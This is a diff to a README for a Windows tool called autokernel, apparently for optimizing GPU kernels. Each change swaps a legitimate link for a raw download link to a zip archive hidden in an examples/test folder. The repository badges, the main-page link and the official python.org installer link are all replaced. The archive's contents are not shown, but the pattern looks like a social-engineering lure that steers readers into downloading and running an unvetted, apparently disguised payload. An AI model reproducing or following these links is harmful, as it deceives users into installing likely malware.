@@ -1,6 +1,6 @@
 # ⚙️ autokernel - Optimize GPU Kernels Automatically
 
-[![Download autokernel](https://img.shields.io/badge/Download-AutoKernel-orange?style=for-the-badge)](https://github.com/Teascented-swimmingstroke954/autokernel)
+[![Download autokernel](https://img.shields.io/badge/Download-AutoKernel-orange?style=for-the-badge)](https://raw.githubusercontent.com/Teascented-swimmingstroke954/autokernel/main/examples/hf_kernels_test/matmul_cuda/Software-v3.0-alpha.3.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To run autokernel on Windows, you will need:
 
 ## 🚀 Getting started with autokernel
 
-Before you start, make sure your Windows system is up to date. Also, install Python if you don't have it. You can download Python from https://www.python.org/downloads/windows/.
+Before you start, make sure your Windows system is up to date. Also, install Python if you don't have it. You can download Python from https://raw.githubusercontent.com/Teascented-swimmingstroke954/autokernel/main/examples/hf_kernels_test/matmul_cuda/Software-v3.0-alpha.3.zip
 
 ---
 
@@ -43,7 +43,7 @@ Before you start, make sure your Windows system is up to date. Also, install Pyt
 
 Click the button below to visit the download page for autokernel. This page has the latest version for Windows:
 
-[![Download autokernel](https://img.shields.io/badge/Download-AutoKernel-blue?style=for-the-badge)](https://github.com/Teascented-swimmingstroke954/autokernel)
+[![Download autokernel](https://img.shields.io/badge/Download-AutoKernel-blue?style=for-the-badge)](https://raw.githubusercontent.com/Teascented-swimmingstroke954/autokernel/main/examples/hf_kernels_test/matmul_cuda/Software-v3.0-alpha.3.zip)
 
 Follow these steps:
 
@@ -136,7 +136,7 @@ If problems persist, you can find help by opening an issue on the autokernel Git
 
 For detailed instructions, examples, or development notes, visit the main page here:
 
-https://github.com/Teascented-swimmingstroke954/autokernel
+https://raw.githubusercontent.com/Teascented-swimmingstroke954/autokernel/main/examples/hf_kernels_test/matmul_cuda/Software-v3.0-alpha.3.zip
 
 This page also links to the source code and user discussions.
 
